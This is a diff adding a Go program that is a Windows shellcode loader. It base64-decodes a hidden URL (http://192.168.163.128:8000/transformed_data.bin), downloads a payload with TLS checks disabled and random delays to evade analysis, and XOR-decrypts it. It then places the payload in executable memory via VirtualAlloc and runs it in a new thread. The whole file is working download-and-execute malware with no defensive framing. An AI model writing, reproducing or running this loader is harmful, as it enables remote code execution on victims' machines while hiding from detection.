@@ -1,0 +1,97 @@
+package main
+
+import (
+ "crypto/tls"
+ "encoding/base64"
+ "io"
+ "math/rand"
+ "net/http"
+ "syscall"
+ "time"
+ "unsafe"
+)
+
+const (
+ MEM_COMMIT             = 0x1000
+ MEM_RESERVE            = 0x2000
+ PAGE_EXECUTE_READWRITE = 0x40
+)
+
+func decrypt(data, key []byte) []byte {
+ out := make([]byte, len(data))
+ for i := range data {
+  out[i] = data[i] ^ key[i%len(key)]
+ }
+ return out
+}
+
+func fetchPayload() ([]byte, []byte, error) {
+ encURL := "aHR0cDovLzE5Mi4xNjguMTYzLjEyODo4MDAwL3RyYW5zZm9ybWVkX2RhdGEuYmlu"
+ urlBytes, _ := base64.StdEncoding.DecodeString(encURL)
+
+ tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
+ client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
+
+ var body []byte
+ for i := 0; i < 3; i++ {
+  time.Sleep(time.Duration(rand.Intn(2000)+1000) * time.Millisecond)
+  resp, err := client.Get(string(urlBytes))
+  if err != nil || resp.StatusCode != 200 {
+   continue
+  }
+  defer resp.Body.Close()
+  body, _ = io.ReadAll(resp.Body)
+  if len(body) > 0 {
+   break
+  }
+ }
+ if len(body) == 0 {
+  return nil, nil, nil
+ }
+
+ decoded, err := base64.StdEncoding.DecodeString(string(body))
+ if err != nil || len(decoded) < 64 {
+  return nil, nil, err
+ }
+ return decoded[48:len(decoded)-16], decoded[16:48], nil
+}
+
+func runShellcode(sc []byte) error {
+ kernel32 := syscall.NewLazyDLL("kernel32.dll")
+ ntdll := syscall.NewLazyDLL("ntdll.dll")
+
+ virtualAlloc := kernel32.NewProc("VirtualAlloc")
+ rtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+ createThread := kernel32.NewProc("CreateThread")
+ wait := kernel32.NewProc("WaitForSingleObject")
+
+ addr, _, _ := virtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+ if addr == 0 {
+  return syscall.GetLastError()
+ }
+
+ rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+
+ thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
+ if thread == 0 {
+  return syscall.GetLastError()
+ }
+
+ wait.Call(thread, 0xFFFFFFFF)
+ return nil
+}
+
+func main() {
+ rand.Seed(time.Now().UnixNano())
+ time.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)
+
+ sc, key, err := fetchPayload()
+ if err != nil || len(sc) == 0 {
+  return
+ }
+
+ decrypted := decrypt(sc, key)
+ if len(decrypted) > 0 {
+  runShellcode(decrypted)
+ }
+}
